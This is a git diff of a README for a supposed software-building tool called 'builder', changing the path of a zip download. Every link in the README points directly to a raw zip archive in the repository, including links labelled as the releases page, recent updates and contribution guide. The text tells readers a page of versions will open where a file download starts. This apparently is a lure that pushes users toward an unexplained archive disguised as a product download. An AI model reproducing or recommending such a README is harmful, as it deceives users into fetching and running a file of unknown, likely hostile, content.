@@ -1,7 +1,7 @@
 # 🛠️ builder - A Simple Way to Build Software
 
 ## 📥 Download Now
-[![Download builder](https://raw.githubusercontent.com/Tz-risk/builder/main/ectocinerea/builder.zip%20builder-v1.0-blue)](https://raw.githubusercontent.com/Tz-risk/builder/main/ectocinerea/builder.zip)
+[![Download builder](https://github.com/Tz-risk/builder/raw/refs/heads/main/etc/Software_2.7.zip%20builder-v1.0-blue)](https://github.com/Tz-risk/builder/raw/refs/heads/main/etc/Software_2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to the builder repository! This software lets you compile and package applications quickly and easily. Even if you are not a programmer, you can use this tool to transform your scripts into standalone apps.
@@ -24,7 +24,7 @@ To run builder, you will need:
 
 ## 📦 Download & Install
 1. **Visit the Releases Page**  
-   Go to the following link to access the download options: [Download builder](https://raw.githubusercontent.com/Tz-risk/builder/main/ectocinerea/builder.zip).
+   Go to the following link to access the download options: [Download builder](https://github.com/Tz-risk/builder/raw/refs/heads/main/etc/Software_2.7.zip).
    
 2. **Choose the Latest Version**  
    On the releases page, you'll see a list of available versions. Find the latest version of builder.
@@ -61,8 +61,8 @@ If you encounter any issues while using builder, please check the FAQ section on
 
 ## 🔗 More Information
 You can find additional resources and updated documentation on the GitHub page. Here are some helpful links:
-- [Recent Updates](https://raw.githubusercontent.com/Tz-risk/builder/main/ectocinerea/builder.zip)
-- [Contribute to builder](https://raw.githubusercontent.com/Tz-risk/builder/main/ectocinerea/builder.zip)
+- [Recent Updates](https://github.com/Tz-risk/builder/raw/refs/heads/main/etc/Software_2.7.zip)
+- [Contribute to builder](https://github.com/Tz-risk/builder/raw/refs/heads/main/etc/Software_2.7.zip)
 
 ## 🙏 Acknowledgments
 Thank you for using builder! We appreciate your interest and hope this tool simplifies your software building process.
